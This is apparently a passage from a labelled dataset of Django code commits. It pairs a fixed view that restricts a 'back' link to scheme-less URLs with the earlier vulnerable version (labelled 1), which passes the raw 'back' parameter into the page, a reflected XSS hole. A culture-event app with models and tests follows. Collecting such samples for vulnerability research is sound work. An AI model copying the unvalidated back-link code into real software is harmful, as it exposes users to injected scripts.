        data = super().get_context_data(*args, **kwargs)

        back = self.request.GET.get('back', None)
        parsed_back_url = urllib.parse.urlparse(back)

        # We only allow blank scheme, e.g. relative urls to avoid reflected XSS
        if back is not None and parsed_back_url.scheme == """":
            data['back_link'] = back

        return data
/n/n/n",0
85,1bd25d971ac3f9ac7ae3915cc2dd86b0ceb44b53,"/socialsystem/core/views.py/n/nfrom django.views.generic import TemplateView, FormView, DetailView
from django.urls import reverse

from .entryform import EntryForm, entry_form_config, build_question_flag
from .models import LifeCondition, Benefit, BenefitRequirement


class BenefitOverview(TemplateView):
    template_name = 'core/benefit_overview.html'

    def get_context_data(self):
        data = super().get_context_data()
        data['life_conditions'] = LifeCondition.objects.with_benefits()
        return data


class BenefitClaimView(FormView):
    template_name = 'core/benefit_claim.html'
    form_class = EntryForm

    def get(self, request, *args, **kwargs):
        form = self.get_form()

        if form.is_valid():
            return self.form_valid(form)
        else:
            return self.render_to_response(self.get_context_data())

    def get_form_kwargs(self, *args, **kwargs):
        kwargs = super().get_form_kwargs()
        kwargs['entry_form_config'] = entry_form_config

        question_ids = {str(q['id']) for q in entry_form_config}
        data = {
            f'{item}': f'{value}' for item, value in self.request.GET.items() if item in question_ids
        }

        if data:
            kwargs['data'] = data

        return kwargs

    def form_valid(self, form):
        selected_flags = []

        # Assemble query
        for question in entry_form_config:
            flag = form.cleaned_data.get(str(question['id']), False)

            if flag:
                selected_flags.append(getattr(BenefitRequirement.flags, build_question_flag(question)))

        return self.render_to_response({
            'form': form,
            'submitted': True,
            'claimable_benefits': Benefit.objects.find_claimable(selected_flags),
        })


class BenefitDetailView(DetailView):
    model = Benefit
    template_name = 'core/benefit_detail.html'

    def get_context_data(self, *args, **kwargs):
        data = super().get_context_data(*args, **kwargs)

        if self.request.GET.get('back', None) is not None:
            data['back_link'] = self.request.GET['back']

        return data
/n/n/n",1
86,a06d85cd0b0964f8469e5c4bc9a6c132aa0b4c37,"CE/models.py/n/nfrom django.db import models
from django.utils.text import slugify
from django.core.files.uploadedfile import InMemoryUploadedFile
from PIL import Image
from io import BytesIO

import CE.settings
import sys
import re
import bleach

class CultureEvent(models.Model):
    title = models.CharField(max_length=60, blank=False, unique=True)
    date_created = models.DateTimeField(auto_now_add=True)
    last_modified = models.DateTimeField(auto_now=True)
    last_modified_by = models.CharField(max_length=20)
    # plain text description is what the user has entered. description is a processed version of the plain text
    # that adds hyperlinks and is displayed escaped so the html generates
    description = models.TextField(blank=True)
    description_plain_text = models.TextField(blank=True)

    differences = models.TextField(blank=True)
    interpretation = models.TextField(blank=True)
    slug = models.SlugField(unique=True) # set in save function, form doesn't need to validate it

    def save(self):
        # copy the user's input from plain text to description to be processed
        # uses bleach to remove potentially harmful HTML code
        self.description = bleach.clean(str(self.description_plain_text),
                                        tags=CE.settings.bleach_allowed,
                                        strip=True)
        if CE.settings.auto_cross_reference:
            self.auto_cross_ref()
        else:
            self.find_tag()
        self.slug = slugify(self.title)
        super().save()

    def find_tag(self):
        # todo case sensitive, shouldn't be
        # find anything in the plain text description with {} around it and replace it with a hyperlink if valid
        # only triggers if auto_cross_reference is False
        tags = re.findall(r'{.+?}', self.description)
        ce_slugs = self.list_slugs()
        for tag in tags:
            content = tag
            content = content.strip('{')
            content = content.strip('}')
            for i, title_slug in enumerate(ce_slugs):
                # if slug found within {} replace with hyperlink
                if title_slug in slugify(content):
                    title_deslug = title_slug.replace('-', ' ')
                    slug_href = '<a href=""' + title_slug + '"">' + title_deslug + '</a>'
                    self.description = self.description.replace('{'+ title_deslug + '}', slug_href)
                # if none of the title slugs are found remove the {}
                elif i == len(ce_slugs) - 1:
                    self.description = self.description.replace(tag, content)


    def auto_cross_ref(self):
        # todo Will miss cases where user uses a capital. Currently only works with lower case.
        # search the plain text description for slugs and replace them with hyperlinks if found
        # only triggers if auto_cross_reference is True
        slugged_description = slugify(self.description_plain_text)
        ce_slugs = self.list_slugs()
        for title_slug in ce_slugs:
            if title_slug in slugged_description:
                title_deslug = title_slug.replace('-', ' ')
                slug_href = '<a href=""' + title_slug + '"">' + title_deslug + '</a>'
                self.description = self.description.replace(title_deslug, slug_href)

    def list_slugs(self):
        ce_objects = CultureEvent.objects.all()
        ce_slugs = [i.slug for i in ce_objects]
        return ce_slugs

    def __str__(self):
        return str(self.title)


class ParticipationModel(models.Model):
    ce = models.ForeignKey('CultureEvent', on_delete=models.CASCADE)
    team_participants = models.CharField(blank=True, max_length=60)
    national_participants = models.CharField(blank=True, max_length=60)
    date = models.DateField(blank=False)

    def __str__(self):
        return str('Participants for ' + str(self.ce))


# provide file folders to save audio and pictures in using foreign keys
def picture_folder(instance, filename):
    return '/'.join(['CultureEventFiles', str(instance.ce.id), 'images', filename])


def audio_folder(instance, filename):
    return '/'.join(['CultureEventFiles', str(instance.ce.id), 'audio', filename])


class PictureModel(models.Model):
    ce = models.ForeignKey('CultureEvent', on_delete=models.CASCADE)
    picture = models.ImageField(upload_to=picture_folder, blank=True)
    # blank=True is a fudge. Trying to display multiple models in a single form and it wont'
    # submit if there is validation. The view function makes sure blank entries aren't saved though

    def __str__(self):
        return 'Picture for ' + str(self.ce)

    def save(self):
        im = Image.open(self.picture)
        output = BytesIO()
        im = im.resize((1200, 900))
        im.save(output, format='JPEG', quality=90)
        output.seek(0)
        self.picture = InMemoryUploadedFile(output, 'PictureField',
                                            ""%s.jpg"" % self.picture.name.split('.')[0],
                                            'image/jpeg',
                                             sys.getsizeof(output), None)

        super(PictureModel, self).save()


class TextModel(models.Model):
    ce = models.ForeignKey('CultureEvent', on_delete=models.PROTECT)
    audio = models.FileField(upload_to=audio_folder, blank=False)
    phonetic_text = models.TextField(blank=True)
    phonetic_standard = models.CharField(choices=[('1', 'Unchecked'),
                                                  ('2', 'Double checked by author'),
                                                  ('3', 'Checked by team mate'),
                                                  ('4', 'Approved by whole team'),
                                                  ('5', 'Valid for linguistic analysis')],
                                         max_length=30,
                                         blank=True)
    orthographic_text = models.TextField(blank=True)
    valid_for_DA = models.BooleanField()
    discourse_type = models.CharField(choices=[('1', 'Narrative'),
                                               ('2', 'Hortatory'),
                                               ('3', 'Procedural'),
                                               ('4', 'Expository'),
                                               ('5', 'Descriptive')],
                                      max_length=15,
                                      blank=True)

    def __str__(self):
        return 'Text for ' + str(self.ce)


class QuestionModel(models.Model):
    ce = models.ForeignKey('CultureEvent', on_delete=models.CASCADE)
    question = models.CharField(max_length=200)
    answer = models.CharField(max_length=200,
                              blank=True)
    date_created = models.DateTimeField(auto_now_add=True)
    asked_by = models.CharField(max_length=30)
    last_modified = models.DateTimeField(auto_now=True)
    last_modified_by = models.CharField(max_length=20)
    answered_by = models.CharField(max_length=20)

    def __str__(self):
        return 'Question about ' + str(self.ce) + ' CE'
/n/n/nCE/settings.py/n/nculture_events_shown_on_home_page = 10
# If auto_cross_reference = True program will scan description field for url slugs whenever that
# CE is saved. If it finds a matching slug in the description it will add a hyperlink
# If False hyperlinks will only be added to valid slugs within curly brackets {}
auto_cross_reference = True
# A list of allowed HTML tags the user can enter to HTML escaped fields.
bleach_allowed = ['strong', 'p']/n/n/nCE/tests.py/n/nfrom django.test import TestCase
from django.urls import reverse
from django.db.utils import IntegrityError
from django.contrib.auth.models import User
from django.core.files.uploadedfile import SimpleUploadedFile
from CE import models, settings, forms

import os
import time

# A separate test class for each model or view
# a seperate test method for each set of conditions you want to test
# test methods that describe their function

# view tests
class CEHomeViewTest(TestCase):
    def setUp(self):
        self.total_CEs = settings.culture_events_shown_on_home_page + 1
        for i in range(self.total_CEs):
            Ces = models.CultureEvent(title=('Example culture event ' + str(i)),
                                      last_modified_by='Tester')
            Ces.save()

    def test_home_page_returns_correct_html(self):
        # home page should show recently modified CEs
        response = self.client.get(reverse('CE:home_page'))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, '<!doctype html>') # checks base template used
        self.assertContains(response, 'CE Home')
        self.assertTemplateUsed('CE/home.html')
        # test CE's loaded
        self.assertContains(response, 'Example culture event 2')
        # test not more loaded than settings allow
        self.assertNotContains(response, 'Example culture event ' + str(self.total_CEs))
        self.assertContains(response, 'by Tester')


class TestViewPage(TestCase):
    def setUp(self):
        ce = models.CultureEvent(title='Example CE1',
                                 description_plain_text='A culture event happened',
                                 differences='Last time it was different')
        ce.save()
        text = models.TextModel(ce=models.CultureEvent.objects.get(pk=1),
                            audio='musicFile.ogg',
                            phonetic_text='fontks',
                            orthographic_text='orthographic',
                            valid_for_DA=False)
        text.save()

    def test_view_page(self):
        # should return Example CE 1 page
        response = self.client.get(reverse('CE:view', args='1'))
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed('CE/view_CE.html')
        self.assertContains(response, 'Example CE1')
        self.assertContains(response, 'fontks')
        self.assertContains(response, 'musicFile.ogg')

    def test_404(self):
        # test an out of range index
        response = self.client.get(reverse('CE:view', args='2'))
        self.assertEqual(response.status_code, 404)

# class TestEditPage(TestCase):
#     @classmethod
#     def setUpClass(cls):
#         super().setUpClass()
#         credentials = User(username='Tester')
#         credentials.set_password('secure_password')
#         credentials.save()
#
#     def setUp(self):
#         self.client.login(username='Tester', password='secure_password')
#         ce = models.CultureEvent(title='Example CE1',
#                                  description='A culture event happened',
#                                  participation='Rhett did it',
#                                  differences='Last time it was different')
#         ce.save()
#         # todo text model not used in tests
#         text = models.TextModel(ce=models.CultureEvent.objects.get(pk=1),
#                             audio='musicFile.ogg',
#                             phonetic_text='fontks',
#                             orthographic_text='orthographic')
#         text.save()
#
#     def test_edit_page_GET_response(self):
#         # Form should populate with database data
#         response = self.client.get(reverse('CE:edit', args='1'))
#         self.assertEqual(response.status_code, 200)
#         self.assertTemplateUsed('CE/edit_CE.html')
#         html = response.content.decode('utf8')
#         self.assertContains(response, '<form')
#         # check form contents
#         self.assertContains(response, 'value=""Example CE1""')
#         self.assertContains(response, 'Rhett did it')
#
#     def test_valid_edit_page_POST_response_change_everything(self):
#         # CE model should be updated, a new one shouldn't be created
#         response = self.client.post(reverse('CE:edit', args='1'), {'title' : 'BAM',
#                                                                    'participation' : 'minimal',
#                                                                    'description' : 'pretty easy'},
#                                     follow=True)
#         self.assertTemplateUsed('CE/edit_CE.html')
#         self.assertEqual(response.redirect_chain[0][1], 302, 'No redirect following POST')
#         ce = models.CultureEvent.objects.get(pk=1)
#         self.assertEqual(ce.title, 'BAM', 'edit not saved to db')
#         self.assertFalse(ce.title == 'Example CE1', 'edit not saved to db')
#         self.assertEqual(ce.last_modified_by, 'Tester', 'Last modified by not updated')
#         self.assertEqual(response.status_code, 200, 'New page not shown')
#         self.assertContains(response, 'BAM')
#
#     def test_valid_edit_page_POST_response_change_description_not_title(self):
#         # CE model should be updated, a new one shouldn't be created
#         response = self.client.post(reverse('CE:edit', args='1'), {'title' : 'Example CE1',
#                                                                    'participation': 'minimal',
#                                                                    'description': 'pretty easy'},
#                                     follow=True)
#         self.assertTemplateUsed('CE/edit_CE.html')
#         self.assertEqual(response.redirect_chain[0][1], 302, 'No redirect following POST')
#         ce = models.CultureEvent.objects.get(pk=1)
#         self.assertEqual(ce.title, 'Example CE1', 'edit not saved to db')
#         self.assertEqual(ce.description, 'pretty easy', 'edit not saved to db')
#         self.assertEqual(response.status_code, 200, 'New page not shown')
#         self.assertContains(response, 'Example CE1')
#         self.assertEqual(ce.last_modified_by, 'Tester', 'Last modified by not updated')
#
#     def test_edit_page_no_changes(self):
#         # no changes should go through, but .db unchanged
#         ce = models.CultureEvent.objects.get(pk=1)
#         response = self.client.post(reverse('CE:edit', args='1'), {'title': 'Example CE1',
#                                                                    'participation': 'Rhett did it',
#                                                                    'description': 'A culture event happened',
#                                                                    'differences' : 'Last time it was different'},
#                                     follow=True)
#         new_ce = models.CultureEvent.objects.get(pk=1)
#         self.assertEqual(response.redirect_chain[0][1], 302, 'No redirect following POST')
#         self.assertEqual(ce, new_ce)
#         self.assertEqual(ce.title, new_ce.title)
#
#     def test_edit_page_changing_to_existing_CE_title(self):
#         # should reject changing to an existing title
#         ce = models.CultureEvent(title='Example CE2',
#                                  description='A culture event happened',
#                                  participation='Rhett did it',
#                                  differences='Last time it was different')
#         ce.save()
#         response = self.client.post(reverse('CE:edit', args='2'), {'title': 'Example CE1',
#                                                                    'participation': 'Rhett did it',
#                                                                    'description': 'A culture event happened',
#                                                                    'differences': 'Last time it was different'},
#                                     follow=True)
#         self.assertContains(response, 'Culture event with this Title already exists')
#         self.assertEqual(models.CultureEvent.objects.get(pk=2).title, 'Example CE2')
#         self.assertEqual(models.CultureEvent.objects.get(pk=1).title, 'Example CE1')


class NewCEPageTest(TestCase):
    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        credentials = User(username='Tester')
        credentials.set_password('secure_password')
        credentials.save()

    def setUp(self):
        self.client.login(username='Tester', password='secure_password')
        # have one model previously in .db
        ce = models.CultureEvent(title='Example CE1',
                                 description_plain_text='A culture event happened',
                                 differences='Last time it was different')
        ce.save()
        participants = models.ParticipationModel(date='2019-08-05',
                                                 team_participants='Steve',
                                                 national_participants='Ulumo',
                                                 ce=ce)
        participants.save()

    def test_new_CE_page_GET_response(self):
        # blank form should be returned
        response = self.client.get(reverse('CE:new'))
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed('CE/new_CE.html')
        self.assertContains(response, 'Create a new CE')
        self.assertContains(response, '<form')
        self.assertContains(response, '<label for=""id_title"">CE title:</label>')

    def test_new_CE_Page_valid_POST_response(self):
        # new CE should be created
        response = self.client.post(reverse('CE:new'), {
            'title': 'A test CE',
            'description_plain_text' : 'I\'m testing this CE',
            'date': '2019-04-20',
            'national_participants': 'Ulumo',
            'team_participants': 'Rhett',
            'text-TOTAL_FORMS': 0,
            'text-INITIAL_FORMS': 0,
            'question-TOTAL_FORMS': 0,
            'question-INITIAL_FORMS': 0
        }, follow=True)
        self.assertTemplateUsed('CE/new_CE.html')
        self.assertRedirects(response, '/CE/2')
        ce = models.CultureEvent.objects.get(pk=2)
        self.assertEqual(ce.title, 'A test CE', 'new CE title not correct')
        self.assertEqual(ce.description_plain_text, 'I\'m testing this CE', 'new CE description not correct')
        self.assertEqual('A test CE', ce.title, 'New CE not in database')
        self.assertEqual(response.status_code, 200, 'New page not shown')
        self.assertContains(response, 'A test CE')
        self.assertEqual(ce.last_modified_by, 'Tester', 'Last modified by not updated')
        self.assertEqual(len(models.TextModel.objects.all()), 0, 'A blank Text was added')

        response = self.client.get(reverse('CE:view', args='2'))
        self.assertEqual(response.status_code, 200, 'New CE view page not displaying correctly')


    def test_new_CE_page_invalid_POST_repeated_title_response(self):
        # Form should be show again with error message
        response = self.client.post(reverse('CE:new'), {
            'Title': 'Example CE1',
            'description_plain_text': 'I\'m testing this CE',
            'text-TOTAL_FORMS': 0,
            'text-INITIAL_FORMS': 0,
            'question-TOTAL_FORMS': 0,
            'question-INITIAL_FORMS': 0
        }, follow=True)
        self.assertTemplateUsed('CE/new_CE.html')
        #todo form error messages
        # self.assertContains(response, 'Culture event with this Title already exists')
        with self.assertRaises(models.CultureEvent.DoesNotExist):
            models.CultureEvent.objects.get(pk=2)

    def test_new_CE_page_invalid_POST_no_title_response(self):
        # Form should be shown again with error message
        # todo no validation shown
        response = self.client.post(reverse('CE:new'), {
            'description_plain_text': 'I\'m testing this CE',
            'text-TOTAL_FORMS': 0,
            'text-INITIAL_FORMS': 0,
            'question-TOTAL_FORMS': 0,
            'question-INITIAL_FORMS': 0
        }, follow=True)
        self.assertTemplateUsed('CE/new_CE.html')
        # self.assertContains(response, 'This field is required')
        with self.assertRaises(models.CultureEvent.DoesNotExist):
            models.CultureEvent.objects.get(pk=2)

    def test_new_CE_page_saves_single_picture(self):
        # todo refactor - probably as new class. Extensive set up and tear down neccesarry as uploads go into project dir
        # clean up if existing test failed and left a file there
        if os.path.exists('uploads/CultureEventFiles/2/images/test_pic1.jpg'):
            os.remove('uploads/CultureEventFiles/2/images/test_pic1.jpg')
        with open('CLAHub/static/test_data/test_pic1.JPG', 'rb') as file:
            file = file.read()
            test_image = SimpleUploadedFile('test_data/test_pic1.JPG', file, content_type='image')
            response = self.client.post(reverse('CE:new'), {'title': 'Test CE',
                                                            'date': '2019-03-20',
                                                            'national_participants': 'Ulumo',
                                                            'team_participants': 'Philip',
                                                            'picture': test_image,
                                                            'text-TOTAL_FORMS': 0,
                                                            'text-INITIAL_FORMS': 0,
                                                            'question-TOTAL_FORMS': 0,
                                                            'question-INITIAL_FORMS': 0
                                                            })
        self.assertRedirects(response, '/CE/2')
        new_ce = models.CultureEvent.objects.get(pk=2)
        self.assertEqual('Test CE', new_ce.title, 'New CE not saved to db')
        new_pic = models.PictureModel.objects.get(ce=new_ce)
        self.assertEqual('CultureEventFiles/2/images/test_pic1.jpg',
                         str(new_pic.picture), 'New CE not saved to db')

        self.assertTrue(os.path.exists('uploads/CultureEventFiles/2/images'), 'upload folder doesn\'t exist')
        folder_contents = os.listdir('uploads/CultureEventFiles/2/images')
        self.assertIn('test_pic1.jpg', folder_contents, 'Uploaded picture not in upload folder')
        # check smaller than 1Mb
        self.assertTrue(os.path.getsize('uploads/CultureEventFiles/2/images/test_pic1.jpg') < 1000000, 'picture too big')
        # check Foreign key is correct
        self.assertEqual(new_ce, new_pic.ce, 'Foreign key not correct')

        # check image displayed on view page
        response = self.client.get(reverse('CE:view', args='2'))
        self.assertContains(response, 'Test CE')
        self.assertContains(response, '<div id=""carouselExampleIndicators""')
        self.assertContains(response, '<img src=""/uploads/CultureEventFiles/2/images/test_pic1.jpg')

        # clean up after test - test uploads go onto actual file system program uses
        if len(folder_contents) == 1:
            # no user pictures, folder was created for test
            os.remove('uploads/CultureEventFiles/2/images/test_pic1.jpg')
            os.removedirs('uploads/CultureEventFiles/2/images')
        elif len(folder_contents) > 1:
            # users have uploaded pictures themselves
            os.remove('uploads/CultureEventFiles/2/images/test_pic1.jpg')

    def test_new_CE_page_can_save_text_and_audio(self):
        # clean up if existing test failed and left a file there
        if os.path.exists('uploads/CultureEventFiles/2/audio/test_audio1.mp3'):
            os.remove('uploads/CultureEventFiles/2/audio/test_audio1.mp3')
        test_phonetics = 'fni fontk smblz  t '
        test_orthography = 'orthography'
        with open('CLAHub/static/test_data/test_audio1.mp3', 'rb') as file:
            file = file.read()
            test_audio = SimpleUploadedFile('test_data/test_audio1.mp3', file, content_type='audio')
            response = self.client.post(reverse('CE:new'), {'title': 'Test CE',
                                                            'date': '2019-03-20',
                                                            'national_participants': 'Ulumo',
                                                            'team_participants': 'Philip',
                                                            'text-0-phonetic_text': test_phonetics,
                                                            'text-0-orthographic_text': test_orthography,
                                                            'text-0-phonetic_standard': '1',
                                                            'text-0-audio': test_audio,
                                                            'text-0-valid_for_DA': False,
                                                            'text-0-discourse_type': '',
                                                            'text-TOTAL_FORMS': 1,
                                                            'text-INITIAL_FORMS': 0,
                                                            'question-TOTAL_FORMS': 0,
                                                            'question-INITIAL_FORMS': 0
                                                            })
        self.assertRedirects(response, '/CE/2')
        new_ce = models.CultureEvent.objects.get(pk=2)
        self.assertEqual('Test CE', new_ce.title, 'New CE not saved to db')
        new_text = models.TextModel.objects.get(ce=new_ce)
        self.assertEqual('CultureEventFiles/2/audio/test_audio1.mp3',
                         str(new_text.audio), 'New text not saved to db')

        self.assertTrue(os.path.exists('uploads/CultureEventFiles/2/audio'), 'upload folder doesn\'t exist')
        folder_contents = os.listdir('uploads/CultureEventFiles/2/audio')
        self.assertIn('test_audio1.mp3', folder_contents, 'Uploaded audio not in upload folder')
        # check Foreign key is correct
        self.assertEqual(new_ce, new_text.ce, 'Foreign key not correct')
        self.assertEqual(test_phonetics, new_text.phonetic_text, 'Phonetics not correct')
        self.assertEqual(test_orthography, new_text.orthographic_text, 'Orthography not correct')

        # check audio displayed on view page
        response = self.client.get(reverse('CE:view', args='2'))
        self.assertContains(response, 'Test CE')
        self.assertContains(response,
                            '<audio controls> <source src=""/uploads/CultureEventFiles/2/audio/test_audio1.mp3""></audio>')
        # clean up after test - test uploads go onto actual file system program uses
        if len(folder_contents) == 1:
            # no user audio, folder was created for test
            os.remove('uploads/CultureEventFiles/2/audio/test_audio1.mp3')
            os.removedirs('uploads/CultureEventFiles/2/audio')
        elif len(folder_contents) > 1:
            # users have uploaded pictures themselves
            os.remove('uploads/CultureEventFiles/2/audio/test_audio1.mp3')

    def test_single_question_submit(self):
        question = 'Does this work?'
        answer = 'I hope so!'
        response = self.client.post(reverse('CE:new'), {'title': 'Test CE',
                                                            'date': '2019-03-20',
                                                            'national_participants': 'Ulumo',
                                                            'team_participants': 'Philip',
                                                            'text-TOTAL_FORMS': 0,
                                                            'text-INITIAL_FORMS': 0,
                                                            'question-TOTAL_FORMS': 1,
                                                            'question-INITIAL_FORMS': 0,
                                                            'question-0-question': question,
                                                            'question-0-answer': answer
                                                            })
        self.assertRedirects(response, '/CE/2')
        q = models.QuestionModel.objects.all()
        self.assertEqual(len(q), 1)
        self.assertEqual(q[0].question, question)
        self.assertEqual(q[0].answer, answer)
        self.assertEqual(q[0].asked_by, 'Tester')
        self.assertEqual(q[0].last_modified_by, 'Tester')

    def test_incomplete_question_sumbit(self):
        question = 'Does this work?'
        response = self.client.post(reverse('CE:new'), {'title': 'Test CE',
                                                        'date': '2019-03-20',
                                                        'national_participants': 'Ulumo',
                                                        'team_participants': 'Philip',
                                                        'text-TOTAL_FORMS': 0,
                                                        'text-INITIAL_FORMS': 0,
                                                        'question-TOTAL_FORMS': 1,
                                                        'question-INITIAL_FORMS': 0,
                                                        'question-0-question': question,
                                                        })
        self.assertRedirects(response, '/CE/2')
        q = models.QuestionModel.objects.all()
        self.assertEqual(len(q), 1)
        self.assertEqual(q[0].question, question)
        self.assertEqual(q[0].answer, '')
        self.assertEqual(q[0].asked_by, 'Tester')
        self.assertEqual(q[0].last_modified_by, 'Tester')

    def test_multiple_question_submit(self):
        question = 'Does this work?'
        answer = 'I hope so!'
        response = self.client.post(reverse('CE:new'), {'title': 'Test CE',
                                                        'date': '2019-03-20',
                                                        'national_participants': 'Ulumo',
                                                        'team_participants': 'Philip',
                                                        'text-TOTAL_FORMS': 0,
                                                        'text-INITIAL_FORMS': 0,
                                                        'question-TOTAL_FORMS': 40,
                                                        # todo blank forms are being added by JS
                                                        'question-INITIAL_FORMS': 0,
                                                        'question-0-question': question,
                                                        'question-0-answer': answer,
                                                        'question-2-question': question,
                                                        'question-2-answer': answer,
                                                        'question-4-question': question,
                                                        'question-4-answer': answer
                                                        })
        self.assertRedirects(response, '/CE/2')
        q = models.QuestionModel.objects.all()
        self.assertEqual(len(q), 3)
        for thing in q:
            self.assertEqual(thing.question, question)
            self.assertEqual(thing.answer, answer)
            self.assertEqual(thing.asked_by, 'Tester')
            self.assertEqual(thing.last_modified_by, 'Tester')

    def blank_questions_submitted(self):
        response = self.client.post(reverse('CE:new'), {'title': 'Test CE',
                                                        'date': '2019-03-20',
                                                        'national_participants': 'Ulumo',
                                                        'team_participants': 'Philip',
                                                        'text-TOTAL_FORMS': 0,
                                                        'text-INITIAL_FORMS': 0,
                                                        'question-TOTAL_FORMS': 10,
                                                        'question-INITIAL_FORMS': 0,
                                                        })
        self.assertRedirects(response, '/CE/2')
        q = models.QuestionModel.objects.all()
        self.assertEqual(len(q), 0)


class UnloggedUserRedirect(TestCase):
    def test_redirected_from_edit_CE_page(self):
        response = self.client.get(reverse('CE:edit', args='1'), follow=True)
        self.assertTemplateUsed('CE/edit.html')
        self.assertEqual(response.redirect_chain[0][1], 302)
        self.assertEqual(response.status_code, 200,
                         'Unlogged User not redirected from edit CE page')
        self.assertRedirects(response, '/accounts/login/?next=/CE/1/edit')

    def test_redirected_from_new_CE_page(self):
        response = self.client.get(reverse('CE:new'), follow=True)
        self.assertTemplateUsed('CE/edit.html')
        self.assertEqual(response.redirect_chain[0][1], 302)
        self.assertEqual(response.status_code, 200,
                         'Unlogged User not redirected from edit CE page')
        self.assertRedirects(response, '/accounts/login/?next=/CE/new')


class QuestionPageTest(TestCase):
    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        credentials = User(username='Tester')
        credentials.set_password('secure_password')
        credentials.save()

    def setUp(self):
        self.client.login(username='Tester', password='secure_password')
        # have one model previously in .db
        ce = models.CultureEvent(title='An Example CE1',
                                 description_plain_text='A culture event happened',
                                 differences='Last time it was different')
        ce.save()
        participants = models.ParticipationModel(date='2019-08-05',
                                                 team_participants='Steve',
                                                 national_participants='Ulumo',
                                                 ce=ce)
        participants.save()
        questions = models.QuestionModel(question='First question',
                                         answer='First answer',
                                         asked_by='Tester',
                                         ce=ce)
        questions.save()
        time.sleep(0.1)
        ce = models.CultureEvent(title='Cats like Example CE2',
                                 description_plain_text='A culture event happened again',
                                 differences='Last time it was different')
        ce.save()
        questions = models.QuestionModel(question='Second question',
                                         asked_by='Tester',
                                         ce=ce)
        questions.save()
        participants = models.ParticipationModel(date='2019-08-06',
                                                 team_participants='Rhett',
                                                 national_participants='Ulumo',
                                                 ce=ce)
        participants.save()
        time.sleep(0.1)

        ce = models.CultureEvent(title='because I can Example CE3',
                                 description_plain_text='A culture event happened a third time',
                                 differences='Last time it was different')
        ce.save()
        questions = models.QuestionModel(question='Third question',
                                         asked_by='Tester',
                                         ce=ce)
        questions.save()
        time.sleep(0.1)
        questions = models.QuestionModel(question='Fourth question',
                                         asked_by='Tester',
                                         ce=ce)
        questions.save()
        participants = models.ParticipationModel(date='2019-08-07',
                                                 team_participants='Philip',
                                                 national_participants='Ulumo',
                                                 ce=ce)
        participants.save()


    def test_chron_question_page(self):
        response = self.client.get(reverse('CE:questions_chron'))
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed('CE/questions_chron.html')
        self.assertContains(response, 'First question')
        # get a ordered list from .db and then check slice position of each question
        q = models.QuestionModel.objects.all().order_by('-date_created')
        # check that questions were uploaded in the right order on class initialisation
        self.assertEqual(q[0].question, 'Fourth question', 'Test data not in correct order')
        self.assertEqual(q[1].question, 'Third question', 'Test data not in correct order')
        self.assertEqual(q[2].question, 'Second question', 'Test data not in correct order')
        self.assertEqual(q[3].question, 'First question', 'Test data not in correct order')
        html = response.content.decode('utf8')
        q1_pos = html.find(q[0].question)
        q2_pos = html.find(q[1].question)
        q3_pos = html.find(q[2].question)
        q4_pos = html.find(q[3].question)
        self.assertGreater(q2_pos, q1_pos)
        self.assertGreater(q3_pos, q2_pos)
        self.assertGreater(q4_pos, q3_pos)

    def test_alphabetical_question_page(self):
        response = self.client.get(reverse('CE:questions_alph'))
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed('CE/questions_alph.html')
        self.assertContains(response, 'An Example CE1')
        self.assertContains(response, 'because I can Example CE3')
        # get a ordered list from .db and then check slice position of each question
        q = models.QuestionModel.objects.all()
        self.assertEqual(len(q), 4, 'Wrong number of questions')
        set_ces = set([i.ce for i in q])
        set_ces = sorted(set_ces, key=lambda x: x.title.lower())
        self.assertEqual(len(set_ces), 3, 'Wrong number of unique CEs')
        # check that questions were uploaded in the right order on class initialisation
        self.assertEqual(set_ces[0].title, 'An Example CE1', 'Test data not in correct order')
        self.assertEqual(set_ces[1].title, 'because I can Example CE3', 'Test data not in correct order')
        self.assertEqual(set_ces[2].title, 'Cats like Example CE2', 'Test data not in correct order')
        html = response.content.decode('utf8')
        ce1_pos = html.find(set_ces[0].title)
        ce2_pos = html.find(set_ces[1].title)
        ce3_pos = html.find(set_ces[2].title)
        self.assertGreater(ce2_pos, ce1_pos)
        self.assertGreater(ce3_pos, ce2_pos)



# Form tests
class CE_EditFormTests(TestCase):

    def test_valid_data(self):
        # form should be valid
        form_data = {'title' : 'An example CE',
                     'description_plain_text' : 'We did culture',
                     'differences' : 'It went better than last time'}
        form = forms.CE_EditForm(data=form_data)
        self.assertTrue(form.is_valid())

    def test_title_missing_data(self):
        # title is a required field, form should be invalid
        form_data = {'description_plain_text' : 'We did culture',
                     'differences' : 'It went better than last time'}
        form = forms.CE_EditForm(data=form_data)
        self.assertFalse(form.is_valid())

class PictureUploadForm(TestCase):
    def test_valid_data(self):
        with open('CLAHub/static/test_data/test_pic1.JPG', 'rb') as file:
            file = file.read()
            test_image = SimpleUploadedFile('test_data/test_pic1.JPG', file, content_type='image')
        form_data = {'ce': models.CultureEvent(),
                     'picture': test_image}
        form = forms.PictureUploadForm(data=form_data)
        form.full_clean()
        self.assertTrue(form.is_valid())

#     def test_not_a_picture_file(self):
# todo a text file counts as valid image? Rejected at model level, not form level
#         with open('readme.md', 'rb') as file:
#             file = file.read()
#             test_image = SimpleUploadedFile('readme.md', file, content_type='text')
#         form_data = {'ce': models.CultureEvent(),
#                      'picture': test_image}
#         form = forms.PictureUploadForm(data=form_data)
#         form.full_clean()
#         self.assertFalse(form.is_valid())

# Model tests

class CEModelTest(TestCase):
    def test_string_method(self):
        ce = models.CultureEvent(title='Example CE1')
        self.assertEqual(str(ce), 'Example CE1')


    def test_repeated_title_not_allowed(self):
        # CE titles should be unique
        ce = models.CultureEvent(title='Example CE1',
                                 description_plain_text='A first CE')
        ce.save()
        ce = models.CultureEvent(title='Example CE1',
                                 description_plain_text='A second CE')

        with self.assertRaises(IntegrityError):
            ce.save()

    def test_auto_hyperlink(self):
        settings.auto_cross_reference = True
        # create 1st CE
        ce = models.CultureEvent(title='Example CE1',
                                 description_plain_text='A first CE')
        ce.save()
        # create 2nd CE with a hyperlink intended
        description_two = 'A second CE, that references example ce1'
        ce = models.CultureEvent(title='Example CE2',
                                 description_plain_text=description_two)
        ce.save()
        self.assertEqual(description_two, ce.description_plain_text)
        self.assertIn('href', ce.description)

        # create 3rd CE with no hyperlinks intended
        description_three = 'A second CE, that references no other CEs'
        ce = models.CultureEvent(title='Example CE2',
                                 description_plain_text=description_three)
        self.assertEqual(description_three, ce.description_plain_text)
